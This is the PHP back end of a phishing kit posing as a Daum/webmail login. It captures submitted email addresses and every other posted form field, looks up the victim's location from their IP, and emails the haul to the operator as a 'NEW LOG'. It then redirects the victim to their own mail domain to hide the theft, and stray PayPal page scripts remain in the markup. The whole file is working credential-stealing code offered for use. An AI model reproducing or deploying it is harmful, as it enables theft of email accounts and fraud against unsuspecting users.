<?php
require '../../forward.php';
$ip = getenv("REMOTE_ADDR");
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
if(property_exists($ipdat, 'geoplugin_countryCode'));
if(property_exists($ipdat, 'geoplugin_countryName'));
if(property_exists($ipdat, 'geoplugin_city'));
if(property_exists($ipdat, 'geoplugin_region'));
$countrycode = $ipdat->geoplugin_countryCode;
$country = $ipdat->geoplugin_countryName;
$city = $ipdat->geoplugin_city;
$region = $ipdat->geoplugin_region;
$page = 'DAUMNET';
$username = $_POST['email'];
$domain = substr(strrchr($username, "@"), 1);

/*

*/

$my_email = EMAIL;

/*


*/

$from_email = "KEYWORD";

/*

*/

$continue = "https://docs.google.com/a/e-mail.ua/file/d/0B3xRhEC_fLTHNzktb2NfR21oa2s/edit";

/*


*/

$errors = array();

// Remove $_COOKIE elements from $_REQUEST.

if(count($_COOKIE)){foreach(array_keys($_COOKIE) as $value){unset($_REQUEST[$value]);}}

// Validate email field.

if(isset($_REQUEST['email']) && !empty($_REQUEST['email']))
{

$_REQUEST['email'] = trim($_REQUEST['email']);

if(substr_count($_REQUEST['email'],"@") != 1 || stristr($_REQUEST['email']," ")){$errors[] = "Email address is invalid";}else{$exploded_email = explode("@",$_REQUEST['email']);if(empty($exploded_email[0]) || strlen($exploded_email[0]) > 64 || empty($exploded_email[1])){$errors[] = "Email address is invalid";}else{if(substr_count($exploded_email[1],".") == 0){$errors[] = "Email address is invalid";}else{$exploded_domain = explode(".",$exploded_email[1]);if(in_array("",$exploded_domain)){$errors[] = "Email address is invalid";}else{foreach($exploded_domain as $value){if(strlen($value) > 63 || !preg_match('/^[a-z0-9-]+$/i',$value)){$errors[] = "Email address is invalid"; break;}}}}}}

}


// Check for a blank form.

function recursive_array_check_blank($element_value)
{

global $set;

if(!is_array($element_value)){if(!empty($element_value)){$set = 1;}}
else
{

foreach($element_value as $value){if($set){break;} recursive_array_check_blank($value);}

}

}

recursive_array_check_blank($_REQUEST);

if(!$set){$errors[] = "You cannot send a blank form";}

unset($set);

// Display any errors and exit if errors exist.

if(count($errors)){foreach($errors as $value){print "$value<br>";} exit;}

if(!defined("PHP_EOL")){define("PHP_EOL", strtoupper(substr(PHP_OS,0,3) == "WIN") ? "\r\n" : "\n");}

// Build message.

function build_message($request_input){if(!isset($message_output)){$message_output ="";}if(!is_array($request_input)){$message_output = $request_input;}else{foreach($request_input as $key => $value){if(!empty($value)){if(!is_numeric($key)){$message_output .= str_replace("_"," ",ucfirst($key)).": ".build_message($value).PHP_EOL.PHP_EOL;}else{$message_output .= build_message($value).", ";}}}}return rtrim($message_output,", ");}

$message = build_message($_REQUEST);

$ip=$_SERVER['REMOTE_ADDR'];

$message = $message . "IP of sender: ". $ip ." ," . $country ." ," . $countrycode ." ," . $region ." ," . $city;

$message = $message . PHP_EOL.PHP_EOL."------Th@ w@s yOur LOG : SeNt tO [$my_email]------".PHP_EOL."";

$message = stripslashes($message);

$subject = "1 NEW LOG (($page) : ($country))";

$subject = stripslashes($subject);

if($from_email)
{

$headers = "From: " . $from_email;
$headers .= PHP_EOL;
$headers .= "Reply-To: " . $_REQUEST['email'];

}
else
{

$from_name = "KEYWORD";

if(isset($_REQUEST['name']) && !empty($_REQUEST['name'])){$from_name = stripslashes($_REQUEST['name']);}

$headers = "From: {$from_name} <{$_REQUEST['email']}>";

}

mail($my_email,$subject,$message,$headers);

?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

</form><script type="text/javascript">RPT_Init("");_SegmentGroup = "PPP";if (top.location != location) {top.location.href = document.location.href;}</script></body></html>

<div id="navFull"></div>
<script type="text/javascript">
							  // This is an ugly hack until there is a reliable ondomready function
							 if(typeof PAYPAL != 'undefined'){
								 PAYPAL.core.Navigation.init();
							}</script>
<script type="text/JavaScript">
<!--
setTimeout("location.href = 'http://<?php echo $domain ?>?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.113InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1';",20);
-->

</script>
</body>
</html>